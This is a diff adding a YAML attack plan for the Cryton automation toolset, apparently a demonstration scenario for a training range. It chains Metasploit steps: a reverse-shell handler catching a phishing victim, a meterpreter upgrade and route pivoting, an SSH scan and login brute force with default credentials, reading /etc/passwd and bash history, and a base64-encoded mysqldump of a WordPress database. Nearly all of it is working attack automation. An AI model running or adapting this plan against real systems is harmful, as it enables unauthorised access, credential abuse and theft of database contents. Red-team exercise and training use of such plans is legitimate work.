@@ -1,0 +1,166 @@
+#1. Thanks to the phishing, one of the clients is attacked (cannot be the testing account, but the same "pc" can) and a session is created.
+#2. Search for the testing user in the vulnerable servers.
+#3. Bruteforce the testing user.
+#4. Read bash history of the testing user.
+#5. Get access to the database and exfiltrate data.
+
+---
+# Template used for the Cryton toolset demonstration.
+# Required modules: metasploit, command.
+
+plan:
+  name: demo 2023
+  owner: AI DOJO
+  settings:
+    separator: "|"
+  stages:
+    # Stage 1
+    - name: 1-phishing
+      trigger_type: delta
+      trigger_args:
+        seconds: 0
+      steps:
+        - name: phishing-response
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            create_named_session: session-to-workstation-1
+            module: metasploit
+            module_arguments:
+              module_type: exploit
+              module: multi/handler
+              module_options: {}
+              session_filter:
+                via_exploit: multi/handler
+              payload: python/shell_reverse_tcp
+              payload_options:
+                LHOST: 0.0.0.0
+                LPORT: 4444
+          next:
+            - type: result
+              value: ok
+              step: create-meterpreter-session
+
+        - name: create-meterpreter-session
+          step_type: worker/execute
+          arguments:
+            module: metasploit
+            module_arguments:
+              session_filter:
+                via_payload: payload/linux/x86/meterpreter/reverse_tcp
+              module_type: post
+              module: multi/manage/shell_to_meterpreter
+              module_options:
+                SESSION: $phishing-response|session_id
+                LHOST: eth0
+          next:
+            - type: result
+              value: ok
+              step: update-routing-table
+
+        - name: update-routing-table
+          meta:
+            note: If you try to add the same route (on the second run) the module will fail. However, the route still exists so its fine.
+          step_type: worker/execute
+          arguments:
+            module: metasploit
+            module_arguments:
+              module_type: post
+              module: multi/manage/autoroute
+              module_options:
+                CMD: autoadd
+                SESSION: $create-meterpreter-session|session_id
+
+    # Stage 2
+    - name: 2-get-access-to-the-developer-account
+      trigger_type: delta
+      trigger_args:
+        seconds: 10
+      depends_on:
+        - 1-phishing
+      steps:
+        - name: scan-second-workstation
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            module: metasploit
+            module_arguments:
+              module_type: auxiliary
+              module: scanner/portscan/tcp
+              module_options:
+                PORTS: 22
+                RHOSTS: developer
+          next:
+            - type: result
+              value: ok
+              step: bruteforce-the-developer-account
+
+        - name: bruteforce-the-developer-account
+          step_type: worker/execute
+          arguments:
+            create_named_session: session-to-the-developer
+            module: metasploit
+            module_arguments:
+              module_type: auxiliary
+              module: scanner/ssh/ssh_login
+              module_options:
+                RHOSTS: developer
+                USERNAME: developer
+                PASSWORD: developer
+
+    # Stage 3
+    - name: 3-gather-information-from-the-developer-account
+      trigger_type: delta
+      trigger_args:
+        seconds: 25
+      depends_on:
+        - 2-get-access-to-the-developer-account
+      steps:
+        - name: read-wp-hosts
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            use_named_session: session-to-the-developer
+            module: command
+            module_arguments:
+              command: cat /etc/passwd
+
+        - name: check-for-mysqldump
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            use_named_session: session-to-the-developer
+            module: command
+            module_arguments:
+              command: which mysqldump
+
+    # Stage 4
+    - name: 4-data-extraction
+      trigger_type: delta
+      trigger_args:
+        seconds: 30
+      depends_on:
+        - 3-gather-information-from-the-developer-account
+      steps:
+        - name: check-user-bash-history
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            use_named_session: session-to-the-developer
+            module: command
+            module_arguments:
+              command: cat ~/.bash_history
+              end_checks:
+                - mysqldump
+          next:
+            - type: result
+              value: ok
+              step: get-data-from-database
+
+        - name: get-data-from-database
+          step_type: worker/execute
+          arguments:
+            use_named_session: session-to-the-developer
+            module: command
+            module_arguments:
+              command: mysqldump -u cdri -h wordpress_db_node --password=cdri --no-tablespaces cdri | base64
